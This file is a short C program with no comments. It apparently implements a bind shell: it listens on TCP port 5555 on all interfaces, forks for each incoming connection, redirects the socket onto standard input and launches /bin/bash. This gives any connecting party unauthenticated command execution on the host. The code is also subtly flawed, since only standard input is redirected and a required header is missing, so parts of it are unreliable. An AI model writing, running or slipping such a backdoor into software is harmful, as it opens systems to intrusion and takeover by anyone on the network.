#include<sys/socket.h>
#include<netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include<time.h>

#define MAXLEN 100
#define LISTEN 5

int main(int argc,char ** argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	char message[MAXLEN+1];
	int listenfd,sockfd;
	time_t ticks;
	int rc;
	pid_t pid;

	int len = sizeof(client);

	if (0 > (listenfd = socket(AF_INET,SOCK_STREAM,0))) {
		perror(">>> socket");
		exit(1);
	}

	bzero(&server,sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(5555);
	server.sin_addr.s_addr = htonl(INADDR_ANY);

	if (0 > bind(listenfd,(struct sockaddr *) &server,sizeof(server))) {
		perror(">>> bind");
		exit(1);
	}

	if (0 > listen(listenfd,LISTEN)) {
		perror(">>> listen");
		exit(1);
	}

	for(;;){
		sockfd = accept(listenfd,(struct sockaddr *) NULL,NULL);

		if (0 > (pid = fork())) {
			perror(">>> fork");
			exit(1);
		}

		if (0 == pid) {
			/* child -> handles request */
			if (0 > getpeername(sockfd,(struct sockaddr*)&client,&len)) {
				perror(">>> getpeername");
				exit(1);
			} else {
				printf(">>> connection from addr %s port %d\n",
					inet_ntop(AF_INET,&client.sin_addr,message,sizeof(message)),
					ntohs(client.sin_port));
			}

			char shell[] = "/bin/bash"; 	
			char * arg[] = {"/bin/bash",NULL};

			for(rc = 0; rc < 1; rc++){
				if (0 > dup2(sockfd,rc)) {
					perror(">>> dup");
					exit(1);
				}
			}

			if (0 > execve(shell,arg,NULL)) {
				perror(">>> execve");
			}

		}

		/* parent */
		close(sockfd);
	}	
}
